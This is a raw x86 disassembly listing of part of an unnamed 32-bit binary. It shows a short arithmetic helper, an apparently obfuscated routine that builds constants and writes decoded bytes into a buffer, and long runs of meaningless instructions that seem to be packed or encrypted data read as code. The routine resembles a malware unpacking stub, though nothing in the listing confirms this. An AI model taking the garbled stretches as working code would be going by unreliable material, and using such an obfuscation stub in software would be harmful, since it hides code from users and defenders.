  416bed:	shl    BYTE PTR [ebx],1
  416bef:	ror    BYTE PTR [ebx],cl
  416bf1:	ret    0xc703
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42823f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x42836b,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x42821b,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x428293,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x4282f3,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x4281db
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x42821f,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0xfd
  416d7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d7f:	mov    cl,0xb0
  416d81:	jp     0x416d77
  416d83:	push   ss
  416d84:	sbb    cl,ah
  416d86:	adc    bl,BYTE PTR [eax]
  416d88:	sbb    cl,dh
  416d8a:	xor    DWORD PTR [eax+0x31],esi
  416d8d:	add    eax,0x990f508f
  416d92:	mov    ds:0x5b5e465b,al
  416d97:	xor    dl,ah
  416d99:	pusha  
  416d9a:	sub    al,0x27
  416d9c:	push   ebx
  416d9d:	pop    eax
  416d9e:	es pop esi
  416da0:	cmp    BYTE PTR [edi+edx*2],al
  416da3:	(bad)  
  416da4:	repnz xor edi,DWORD PTR [eiz*4+0x633a9cf1]
  416dac:	cwde   
  416dad:	ins    DWORD PTR es:[edi],dx
  416dae:	jecxz  0x416d4a
  416db0:	ret    0x62e3
  416db3:	rcl    ah,0x2a
  416db6:	xchg   esi,eax
  416db7:	pinsrw mm2,WORD PTR [eax+0x57],0xd9
  416dbc:	rol    DWORD PTR ds:0xe9a155e6,cl
  416dc2:	aaa    
  416dc3:	xchg   ebp,eax
  416dc4:	sub    al,0x83
  416dc6:	pop    ecx
  416dc7:	adc    BYTE PTR [eax+edi*1+0x30a87b5b],al
  416dce:	mov    eax,ds:0xd5997507
  416dd3:	add    BYTE PTR ds:0x5bf9c743,bl
  416dd9:	sbb    DWORD PTR [esi+0x78a0d941],eax
  416ddf:	rcl    DWORD PTR [edx+0x7398ba41],1
  416de5:	xor    DWORD PTR [ebp+0x21f13616],ebp
  416deb:	jae    0x416d7c
  416ded:	mov    bh,0x66
  416def:	dec    ebx
  416df0:	rcl    BYTE PTR [esi-0x58f73114],cl
  416df6:	push   ss
  416df7:	add    ah,0xea
  416dfa:	mov    esi,0xd4d6f08a
  416dff:	sahf   
  416e00:	push   ecx
  416e01:	mov    esp,0xef7dc0eb
  416e06:	enter  0xe8c3,0x48
  416e0a:	add    al,0xec
  416e0c:	jbe    0x416e21
  416e0e:	pop    ecx
  416e0f:	pop    ebx
  416e10:	loopne 0x416e5f
  416e12:	loope  0x416e54
  416e14:	cld    
  416e15:	outs   dx,BYTE PTR ds:[esi]
  416e16:	cmp    ecx,esi
  416e18:	retf   0xadb1
  416e1b:	fsubr  QWORD PTR [edx-0x433b5569]
  416e21:	jb     0x416dee
  416e23:	push   ds
  416e24:	rcr    ah,1
  416e26:	aad    0x8f
  416e28:	ss pop ecx
  416e2a:	and    DWORD PTR [esp+ebx*8],eax
  416e2d:	xchg   ebx,eax
  416e2e:	fisub  DWORD PTR [edx-0x79]
  416e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e32:	and    cl,BYTE PTR ds:0x3b6678f4
  416e38:	scas   al,BYTE PTR es:[edi]
  416e39:	mov    ah,0x50
  416e3b:	test   eax,0x86c1bcb
  416e40:	rep ins BYTE PTR es:[edi],dx
  416e42:	pop    ebp
  416e43:	leave  
  416e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e45:	adc    bh,0x8
  416e48:	jle    0x416dce
  416e4a:	and    DWORD PTR [ebx+0x191e0b19],edx
  416e50:	out    dx,eax
  416e51:	imul   ebp,DWORD PTR [ebx+0x74],0xccc0f4cb
  416e58:	xor    ah,BYTE PTR [ebx+0x1]
  416e5b:	(bad)  
  416e5c:	mov    ch,0xe9
  416e5e:	sbb    bh,BYTE PTR [edx]
  416e60:	jno    0x416e75
  416e62:	(bad)  
  416e64:	adc    edi,DWORD PTR [ebp+0x7489077]
  416e6a:	mov    ah,0x76
  416e6c:	xor    ebp,DWORD PTR [edi]
  416e6e:	es ja  0x416e4e
  416e71:	xchg   ecx,eax
  416e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e73:	mov    dl,0x61
  416e75:	lahf   
  416e76:	(bad)  
  416e77:	cld    
  416e78:	sar    DWORD PTR [ecx+0x7a43433e],cl
  416e7e:	push   0xffffffaa
  416e80:	jle    0x416e33
  416e82:	out    0xb4,eax
  416e84:	pop    ds
  416e85:	sub    eax,0x378cf7b4
  416e8a:	retf   
  416e8b:	std    
  416e8c:	iret   
  416e8d:	and    dh,ah
  416e8f:	mov    esp,0xcf61fd47
  416e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e95:	addr16 push edx
  416e97:	sbb    BYTE PTR [ebp+0x65f564c],cl
  416e9d:	mov    ah,0xda
  416e9f:	push   edx
  416ea0:	fucomip st,st(6)
  416ea2:	mov    fs,WORD PTR [edi+0x2e38b4a5]
  416ea8:	adc    ch,0x88
  416eab:	inc    ebx
  416eac:	push   cs
  416ead:	adc    al,0x62
  416eaf:	push   eax
  416eb0:	sbb    ebx,DWORD PTR [si-0x784]
  416eb5:	dec    edx
  416eb6:	in     eax,dx
  416eb7:	cli    
  416eb8:	hlt    
  416eb9:	nop
  416eba:	arpl   WORD PTR [ebx-0xd],bp
  416ebd:	out    dx,al
  416ebe:	aad    0xdc
  416ec0:	push   ebx
  416ec1:	jbe    0x416e87
  416ec3:	mov    ch,0xfa
  416ec5:	dec    ebp
  416ec6:	jb     0x416e59
  416ec8:	xchg   ebx,eax
  416ec9:	das    
  416eca:	mov    bh,0xc8
  416ecc:	sbb    al,0xb2
  416ece:	push   ss
  416ecf:	hlt    
  416ed0:	ins    BYTE PTR es:[edi],dx
  416ed1:	pop    ss
  416ed2:	hlt    
  416ed3:	mov    edi,0xb04e5073
  416ed8:	inc    esi
  416ed9:	fnstcw WORD PTR [edi+esi*1-0x5824380e]
  416ee0:	cmp    ch,BYTE PTR [eax-0x60]
  416ee3:	cmp    al,0xb4
  416ee5:	dec    ecx
  416ee6:	jmp    0x416f20
  416ee8:	addr16 mov esi,0xce59f3d5
  416eee:	jo     0x416e99
  416ef0:	fldenv [esi-0x3e21f621]
  416ef6:	and    edx,DWORD PTR [ebx+0x5e]
  416ef9:	neg    esi
  416efb:	into   
  416efc:	pushf  
  416efd:	push   ss
  416efe:	jb     0x416f1d
  416f00:	and    BYTE PTR ds:0xe6c025ce,al
  416f06:	dec    ebp
  416f07:	inc    ebx
  416f08:	add    DWORD PTR [ecx+0x5d],esp
  416f0b:	push   esp
  416f0c:	cwde   
  416f0d:	or     eax,0xdb43fdbc
  416f12:	call   FWORD PTR [esi-0x50]
  416f15:	jno    0x416f38
  416f17:	mov    esi,0xf55a7a30
  416f1c:	loop   0x416f47
  416f1e:	sar    DWORD PTR [edx-0x12],0x31
  416f22:	icebp  
  416f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f24:	in     al,dx
  416f25:	inc    eax
  416f27:	(bad)  
  416f29:	icebp  
  416f2a:	mov    ebp,0x11c77cb6
  416f2f:	and    esp,DWORD PTR [edi+0xa]
  416f32:	jnp    0x416eb5
  416f34:	push   ds
  416f35:	aam    0xf6
  416f37:	mov    edi,0xc1d1f74e
  416f3c:	xor    dh,BYTE PTR [ebp-0x964a6af]
  416f42:	(bad)  
  416f44:	fnstsw WORD PTR [ebx+0x8ba0e01]
  416f4a:	dec    eax
  416f4b:	dec    ecx
  416f4c:	pop    eax
  416f4d:	aad    0x24
  416f4f:	jecxz  0x416ed1
  416f51:	push   es
  416f52:	adc    DWORD PTR [edx-0x70621d92],edx
  416f58:	ins    DWORD PTR es:[edi],dx
  416f59:	mov    esp,0xc361d3c2
  416f5e:	mov    dl,0xa8
  416f60:	(bad)  
  416f61:	fmul   DWORD PTR [ebx]
  416f63:	into   
  416f64:	cli    
  416f65:	inc    ebx
  416f66:	dec    esp
  416f67:	jb     0x416fce
  416f69:	xchg   edi,eax
  416f6a:	or     dl,BYTE PTR [ebx]
  416f6c:	mov    ch,0x7e
  416f6e:	jl     0x416efe
  416f70:	pop    ebp
  416f71:	cmc    
  416f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f73:	adc    eax,0xd1048126
  416f78:	stos   DWORD PTR es:[edi],eax
  416f79:	inc    ebp
  416f7a:	sub    BYTE PTR [ecx],ch
  416f7c:	pop    ss
  416f7d:	jl     0x416fdc
  416f7f:	in     al,dx
  416f80:	adc    BYTE PTR [edx],bh
  416f82:	dec    eax
  416f83:	out    dx,al
  416f84:	mov    WORD PTR [edi-0x44],?
  416f87:	aam    0x8f
  416f89:	(bad)  
  416f8b:	retf   
  416f8c:	sbb    al,0xbb
  416f8e:	in     al,dx
  416f8f:	sbb    al,0xbf
  416f91:	jns    0x416fe6
  416f93:	scas   eax,DWORD PTR es:[edi]
  416f94:	sbb    esp,esp
  416f96:	(bad)  
  416f97:	mov    ebx,ss
  416f99:	fsub   st(7),st
  416f9b:	imul   edi,DWORD PTR [edi+0x757c0eef],0xe7fd8c9e
  416fa5:	dec    ebx
  416fa6:	(bad)  
  416fa7:	xor    ch,bl
  416fa9:	out    dx,al
  416faa:	dec    edx
  416fab:	and    esp,esi
  416fad:	mov    DWORD PTR [eax-0x7a],edi
  416fb0:	cdq    
  416fb1:	pop    edx
  416fb2:	ficomp DWORD PTR [ecx]
  416fb4:	aaa    
  416fb5:	adc    al,0x35
  416fb7:	or     bp,WORD PTR [esp+edi*8]
  416fbb:	in     al,dx
  416fbc:	mov    ah,BYTE PTR [eax]
  416fbe:	loope  0x416fc0
  416fc0:	or     ch,ah
  416fc2:	jns    0x416f54
  416fc4:	loope  0x416fba
  416fc6:	pop    esi
  416fc7:	adc    dl,BYTE PTR [ecx-0x55]
  416fca:	cmp    al,0xda
  416fcc:	sbb    BYTE PTR [edx],bl
  416fce:	xor    BYTE PTR [eax-0x55],bh
  416fd1:	lods   eax,DWORD PTR ds:[esi]
  416fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fd3:	ficom  DWORD PTR ds:0x75819748
  416fd9:	imul   ecx,eax,0xffffffce
  416fdc:	xchg   ebp,eax
  416fdd:	sub    ecx,DWORD PTR [eax+0xd]
  416fe0:	inc    edi
  416fe1:	es xor al,0x9a
  416fe4:	daa    
  416fe5:	jle    0x416f6d
  416fe7:	pop    ss
  416fe8:	cli    
  416fe9:	push   0x9c040a2c
  416fee:	xor    al,0x55
  416ff0:	lods   al,BYTE PTR ds:[esi]
  416ff1:	mov    edi,0x1a46b39d
  416ff6:	push   ss
  416ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ff8:	mov    ah,0x26
  416ffa:	adc    bh,0xe1
  416ffd:	adc    DWORD PTR [ecx-0x964909b],edi
  417003:	je     0x416fad
  417005:	stos   BYTE PTR es:[edi],al
  417006:	adc    ecx,DWORD PTR [ecx-0x254a5c58]
  41700c:	clc    
  41700d:	and    eax,ebx
  41700f:	jecxz  0x41701c
  417011:	inc    edx
  417012:	jg     0x41704c
  417014:	cld    
  417015:	test   eax,0x88e8082b
  41701a:	shl    BYTE PTR [ebx],0xfd
  41701d:	fld    TBYTE PTR [ecx+0x494f7e40]
  417023:	push   ebx
  417024:	test   al,0xf8
  417026:	scas   eax,DWORD PTR es:[edi]
  417027:	loop   0x416fcc
  417029:	jne    0x417090
  41702b:	mov    ch,BYTE PTR [esi+0x25]
  41702e:	retf   0xd2c7
  417031:	xchg   eax,esp
  417033:	jno    0x416fd1
  417035:	pop    es
  417036:	ss jne 0x41704b
  417039:	in     eax,dx
  41703a:	jmp    0x538c:0x4bfdf926
  417041:	xchg   ebp,eax
  417042:	dec    ecx
  417043:	jecxz  0x417091
  417045:	test   eax,0xda1e0bca
  41704a:	hlt    
  41704b:	hlt    
  41704c:	adc    al,0xfe
  41704e:	lock push ebx
  417050:	jae    0x417037
  417052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417053:	sbb    edx,DWORD PTR [esi-0x1bb6b56b]
  417059:	ret    0x226c
  41705c:	jnp    0x416fee
  41705e:	push   ss
  41705f:	jb     0x417084
  417061:	je     0x4170cb
  417063:	mov    esi,0x5ae88b3d
  417068:	xlat   BYTE PTR ds:[ebx]
  417069:	pop    ebp
  41706a:	lock inc ebx
  41706c:	enter  0x92b9,0x3c
  417070:	dec    eax
  417071:	cs push ds
  417073:	push   0xffffff88
  417075:	out    0x9e,eax
  417077:	loopne 0x41705a
  417079:	call   0x1073:0x2a127dc7
  417080:	sti    
  417081:	inc    esp
  417082:	cwde   
  417083:	mov    bh,0x38
  417085:	adc    BYTE PTR [ebx+edx*2+0x2c],al
  417089:	(bad)  
  41708a:	in     al,0x12
  41708c:	out    0xec,al
  41708e:	leave  
  41708f:	jmp    0x9c999a4c
  417094:	out    0x9b,al
  417096:	or     edi,DWORD PTR [ecx-0x7c]
  417099:	adc    BYTE PTR [ebp-0x306ee9eb],bh
  41709f:	adc    DWORD PTR [ebp-0x6e],edi
  4170a2:	sbb    DWORD PTR [eax+0x7e],ebx
  4170a5:	lock pop eax
  4170a8:	mov    ax,WORD PTR [ebp-0x10]
  4170ac:	mov    ecx,DWORD PTR [ebp-0x14]
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0xb06d13ed
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    BYTE PTR [eax],dh
  41719f:	stc    
  4171a0:	popa   
  4171a1:	das    
  4171a2:	bound  ebx,QWORD PTR [eax]
  4171a4:	pop    esp
  4171a5:	adc    ch,ch
  4171a7:	or     eax,0xff7638a0
  4171ac:	mov    al,ch
  4171ae:	js     0x4171d5
  4171b0:	aaa    
  4171b1:	aaa    
  4171b2:	xor    al,cl
  4171b4:	adc    DWORD PTR [edx],ebx
  4171b6:	dec    ecx
  4171b7:	add    esp,DWORD PTR [edi+ebp*1-0x64731a09]
  4171be:	ins    BYTE PTR es:[edi],dx
  4171bf:	fstp   QWORD PTR [ebp+0x1ec98ca8]
  4171c5:	das    
  4171c6:	inc    esi
  4171c7:	dec    ebp
  4171c8:	popf   
  4171c9:	retf   0x7b59
  4171cc:	inc    ecx
  4171cd:	mov    ebp,0xfa10cebe
  4171d2:	jo     0x4171b1
  4171d4:	jl     0x4171fb
  4171d6:	sub    DWORD PTR ss:[edx+0x2f],esi
  4171da:	dec    eax
  4171db:	pop    edi
  4171dc:	inc    edx
  4171dd:	pusha  
  4171de:	pop    ebp
  4171df:	enter  0x3a38,0x87
  4171e3:	repnz scas eax,DWORD PTR es:[edi]
  4171e5:	clc    
  4171e6:	lods   eax,DWORD PTR ds:[esi]
  4171e7:	shr    BYTE PTR [ecx],cl
  4171e9:	pop    edx
  4171ea:	xchg   esi,eax
  4171eb:	pushf  
  4171ec:	aas    
  4171ed:	mov    ds:0xc54b2f1f,eax
  4171f2:	push   ebx
  4171f3:	push   ds
  4171f4:	nop
  4171f5:	cmp    eax,0xf64c1638
  4171fa:	pop    ds
  4171fb:	push   esi
  4171fc:	cmp    BYTE PTR [eax],bh
  4171fe:	fsub   DWORD PTR [esp+esi*2]
  417201:	pop    es
  417202:	jno    0x4171a1
  417204:	vshufps ymm1,ymm3,YMMWORD PTR [ebx],0xd2
  417209:	scas   eax,DWORD PTR es:[edi]
  41720a:	mov    dl,0x81
  41720c:	lods   eax,DWORD PTR ds:[esi]
  41720d:	inc    esi
  41720e:	jbe    0x4171b8
  417210:	stos   DWORD PTR es:[edi],eax
  417211:	lahf   
  417212:	outs   dx,BYTE PTR ds:[esi]
  417213:	jl     0x417288
  417215:	fistp  QWORD PTR [esi]
  417217:	mov    ebx,0x541d61da
  41721c:	test   DWORD PTR [edx+0x2c],0xea2b3429
  417223:	sub    eax,0x35f4ac3c
  417228:	add    eax,0x589020af
  41722d:	push   esi
  41722e:	or     eax,0x1031fabf
  417233:	push   eax
  417234:	sub    DWORD PTR [ebx-0x6d],esi
  417237:	jae    0x417242
  417239:	push   ecx
  41723a:	shl    DWORD PTR [ebx],cl
  41723c:	test   DWORD PTR ss:[edx+0x77],eax
  417240:	add    al,0xa
  417242:	popaw  
  417244:	out    dx,al
  417245:	repz jnp 0x41729d
  417248:	pop    es
  417249:	(bad)  
  41724a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41724b:	inc    ebp
  41724c:	(bad)  
  41724e:	fsub   st,st(0)
  417250:	mov    bh,0x98
  417252:	cs clc 
  417254:	sub    eax,0xba3b6954
  417259:	mov    cl,0x33
  41725b:	cmp    al,0x67
  41725d:	jb     0x41729b
  41725f:	or     DWORD PTR [edx-0x38],0x5b
  417263:	jle    0x41722a
  417265:	shl    dl,0xd4
  417268:	mov    esp,0x9d142e40
  41726d:	sti    
  41726e:	xor    bh,0xc4
  417271:	dec    esi
  417272:	dec    ebx
  417273:	jg     0x4172af
  417275:	daa    
  417276:	js     0x4172f0
  417278:	std    
  417279:	lds    edx,FWORD PTR [eax-0x3c]
  41727c:	jmp    0x417218
  41727e:	in     al,dx
  41727f:	jbe    0x41722d
  417281:	push   ds
  417282:	cld    
  417283:	inc    ebp
  417284:	inc    eax
  417285:	loope  0x4172fa
  417287:	dec    esp
  417288:	test   DWORD PTR [ebp+0x17],esp
  41728b:	xor    ah,ch
  41728d:	mov    BYTE PTR fs:[esi+0x1c],cl
  417291:	fs cld 
  417293:	pushf  
  417294:	or     bl,dl
  417296:	xchg   esi,eax
  417297:	jbe    0x417263
  417299:	sbb    eax,0xb8dff0ad
  41729e:	in     eax,0x8d
  4172a0:	sub    eax,0xd1eebfa8
  4172a5:	sbb    eax,DWORD PTR [edi-0x60370883]
  4172ab:	add    al,0x3c
  4172ad:	adc    BYTE PTR [esi-0x4e4011a3],dh
  4172b3:	jl     0x4172e7
  4172b5:	push   esp
  4172b6:	adc    dl,BYTE PTR [ebx]
  4172b8:	in     eax,dx
  4172b9:	int    0x29
  4172bb:	mov    ebx,edi
  4172bd:	xor    eax,0xab3ce46d
  4172c2:	xchg   BYTE PTR ss:[esi-0xe],bl
  4172c6:	jbe    0x4172d8
  4172c8:	add    al,0x98
  4172ca:	push   esi
  4172cb:	pop    edi
  4172cc:	test   eax,0x7b446af6
  4172d2:	adc    al,0xbe
  4172d4:	pusha  
  4172d5:	inc    ecx
  4172d6:	ins    DWORD PTR es:[edi],dx
  4172d7:	jne    0x41730f
  4172d9:	inc    esp
  4172da:	push   ebp
  4172db:	fldenv [esi+0x62]
  4172de:	inc    eax
  4172df:	fidiv  DWORD PTR [eax-0x74be660]
  4172e5:	adc    al,0x15
  4172e7:	and    eax,DWORD PTR [edx-0x58]
  4172ea:	jo     0x4172e4
  4172ec:	cs dec ebx
  4172ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ef:	gs aas 
  4172f1:	push   es
  4172f2:	sub    eax,0xe33540ef
  4172f7:	xor    DWORD PTR gs:[ebx+0x7f],ecx
  4172fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172fc:	retf   
  4172fd:	pop    ds
  4172fe:	add    ah,BYTE PTR [esi+0x3]
  417301:	push   ebx
  417302:	sub    DWORD PTR [ecx-0x4b],esi
  417305:	repz clc 
  417307:	xor    DWORD PTR [edx-0x1ace5e0a],esp
  41730d:	retf   0x8c42
  417310:	call   0x1c23:0xf44a9533
  417317:	aad    0xa2
  417319:	scas   al,BYTE PTR es:[edi]
  41731a:	sbb    ebp,DWORD PTR [ecx+0x33c93196]
  417320:	js     0x41735d
  417322:	jmp    0xc871e3c5
  417327:	lock mov dh,0x31
  41732a:	pop    edx
  41732b:	call   0x758d0fda
  417330:	adc    bl,BYTE PTR [ecx+0x47]
  417333:	and    eax,0xffffff8f
  417336:	stos   DWORD PTR es:[edi],eax
  417337:	ss jno 0x417339
  41733a:	or     eax,DWORD PTR [eax-0x1a]
  41733d:	not    BYTE PTR [edx+0x53]
  417340:	sahf   
  417341:	cmp    ebp,esp
  417343:	pop    esp
  417344:	sbb    ecx,DWORD PTR [eax+0x2a]
  417347:	pop    es
  417348:	ret    0xf43c
  41734b:	mov    DWORD PTR [eax+0xd],ebp
  41734e:	call   0xf42e:0x22ffacca
  417355:	mov    dl,0x71
  417357:	push   edi
  417358:	aaa    
  417359:	aam    0x58
  41735b:	test   DWORD PTR [esi],eax
  41735d:	fs mov al,0xd8
  417360:	out    dx,eax
  417361:	nop
  417362:	imul   DWORD PTR [edx+ebx*4]
  417365:	out    0xea,eax
  417367:	jo     0x4173c7
  417369:	add    bh,BYTE PTR [edi-0x6b85dc2e]
  41736f:	cld    
  417370:	nop
  417371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417372:	push   es
  417373:	or     eax,0x159ad11f
  417378:	jmp    0x41733c
  41737a:	add    eax,0x7762fc2c
  41737f:	ficomp WORD PTR [edi]
  417381:	push   esp
  417382:	sbb    DWORD PTR [ecx-0x1ae1884e],edx
  417388:	paddw  mm4,QWORD PTR [ebx+0x5c3dc95d]
  41738f:	shl    DWORD PTR [ecx],0xae
  417392:	cdq    
  417393:	call   0x67f4b3d
  417398:	ret    
  417399:	push   eax
  41739a:	daa    
  41739b:	add    al,0xf0
  41739d:	mov    al,ds:0x453f04cd
  4173a2:	add    esi,0x63739537
  4173a8:	sub    ch,ah
  4173aa:	outs   dx,DWORD PTR ds:[esi]
  4173ab:	dec    ebp
  4173ac:	mov    bl,0xeb
  4173ae:	lods   eax,DWORD PTR ds:[esi]
  4173af:	mov    bh,0x55
  4173b1:	dec    eax
  4173b2:	xchg   esi,eax
  4173b3:	jmp    DWORD PTR [edx-0x77]
  4173b6:	outs   dx,BYTE PTR ds:[esi]
  4173b7:	mov    cr3,ebp
  4173ba:	stos   BYTE PTR es:[edi],al
  4173bb:	add    edi,DWORD PTR [ecx]
  4173bd:	xor    DWORD PTR ds:0x3ba1359f,edi
  4173c3:	push   ecx
  4173c4:	cmc    
  4173c5:	je     0x417445
  4173c7:	cmp    eax,0x27fda95d
  4173cc:	mov    esi,0xd8a9fc9a
  4173d1:	jnp    0x4173a0
  4173d3:	mov    al,0x40
  4173d5:	inc    ebp
  4173d6:	or     DWORD PTR [eax-0x9],ebx
  4173d9:	popa   
  4173da:	fisub  DWORD PTR [edx-0x4069043f]
  4173e0:	mov    dl,0xa2
  4173e2:	adc    ch,BYTE PTR [edx-0x42fb5604]
  4173e8:	pop    edi
